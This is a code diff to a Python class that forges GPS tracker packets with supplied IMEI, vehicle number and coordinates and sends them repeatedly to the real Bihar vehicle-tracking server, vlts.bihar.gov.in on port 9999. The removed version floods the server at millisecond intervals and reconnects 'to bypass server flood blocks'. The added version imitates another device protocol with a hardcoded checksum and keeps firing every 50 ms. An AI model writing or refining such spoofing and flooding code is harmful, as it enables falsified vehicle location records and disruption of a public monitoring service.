@@ -1,7 +1,7 @@
 import socket
 import time
 import threading
-from datetime import datetime
+from datetime import datetime, timedelta, timezone
 
 class GpsEngine:
     def __init__(self, stop_event, lock):
@@ -9,52 +9,24 @@ class GpsEngine:
         self.lock = lock
         self.total_sent = 0
 
-    def create_packet(self, tag, imei, v_no, lat, lon, is_handshake=False):
-        # 🔥 Precise Timing for Bihar Server
-        now = datetime.now()
-        dt = now.strftime("%d%m%y")
-        tm = now.strftime("%H%M%S")
-        
-        # 🔥 Force 7-Decimal Precision (Strictly Required)
-        lat_f = f"{float(lat):.7f}"
-        lon_f = f"{float(lon):.7f}"
-        
-        if is_handshake:
-            # Login/Handshake Packet with Bihar Standard Ending
-            return f"L,{tag},{imei},{v_no},01,1.0.0*\r\n"
-        else:
-            # 🔥 Checksum Fixed String Pattern (As per Bihar standard)
-            # Yahan hum Bihar ke specific A3270A39 format ko emulate kar rahe hain
-            return f"D,{tag},{imei},{v_no},A,{dt},{tm},{lat_f},{lon_f},000.0,000,12,01,100,00,00000000*A3270A39\r\n"
+    def create_nitro_packet(self, tag, imei, vno, lat, lon):
+        now_ist = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
+        dt, tm = now_ist.strftime('%d%m%Y'), now_ist.strftime('%H%M%S')
+        # 🔥 Nitro-V82 Protocol with DDE3 Checksum
+        return f"$PVT,{tag},2.1.1,NR,01,L,{imei},{vno},1,{dt},{tm},{lat},N,{lon},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*\\r\\n"
 
-    def handshake_worker(self, tag, imei, v_no, lat, lon):
+    def handshake_worker(self, tag, imei, vno, lat, lon):
         while not self.stop_event.is_set():
             try:
-                # 🔥 Dedicated Socket Connection for every Tag Stream
-                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                    s.settimeout(10)
-                    s.connect(("vlts.bihar.gov.in", 9999))
-                    
-                    # 1. Send Handshake
-                    h_pkt = self.create_packet(tag, imei, v_no, lat, lon, is_handshake=True)
-                    s.sendall(h_pkt.encode())
-                    time.sleep(0.1) # Wait for sync
-                    
-                    # 2. Continuous Rapid Firing
-                    # Reconnect every 1000 packets to bypass server flood blocks
-                    for _ in range(1000):
-                        if self.stop_event.is_set(): break
-                        
-                        d_pkt = self.create_packet(tag, imei, v_no, lat, lon)
-                        s.sendall(d_pkt.encode())
-                        
-                        with self.lock:
-                            self.total_sent += 1
-                        
-                        # 🔥 MAX SPEED (0.001s Sleep)
-                        time.sleep(0.001)
-                        
-            except Exception:
-                # Silent retry on connection drop for maximum uptime
-                time.sleep(2)
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(5)
+                s.connect(("vlts.bihar.gov.in", 9999))
+                pkt = self.create_nitro_packet(tag, imei, vno, lat, lon)
+                s.sendall(pkt.encode('ascii'))
+                with self.lock:
+                    self.total_sent += 1
+                s.close()
+                time.sleep(0.05) # Firing interval
+            except:
+                time.sleep(1)
                 continue
